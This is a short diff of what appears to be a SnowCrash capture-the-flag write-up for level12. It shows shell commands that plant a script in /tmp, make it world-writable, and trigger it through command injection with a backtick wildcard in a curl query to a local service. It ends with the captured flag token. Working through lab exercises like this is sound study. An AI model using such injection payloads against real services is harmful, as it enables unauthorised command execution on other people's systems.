@@ -53,7 +53,7 @@ substitution to work.
 level12@SnowCrash:~$ echo 'getflag > /tmp/level12' > /tmp/LEVEL12
 level12@SnowCrash:~$ cat /tmp/LEVEL12
 getflag > /tmp/level12
-level12@SnowCrash:~$ chmod +r /tmp/LEVEL12
+level12@SnowCrash:~$ chmod 777 /tmp/LEVEL12
 level12@SnowCrash:~$ curl localhost:4646?x='`/*/LEVEL12`'
 ..level12@SnowCrash:~cat /tmp/level12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
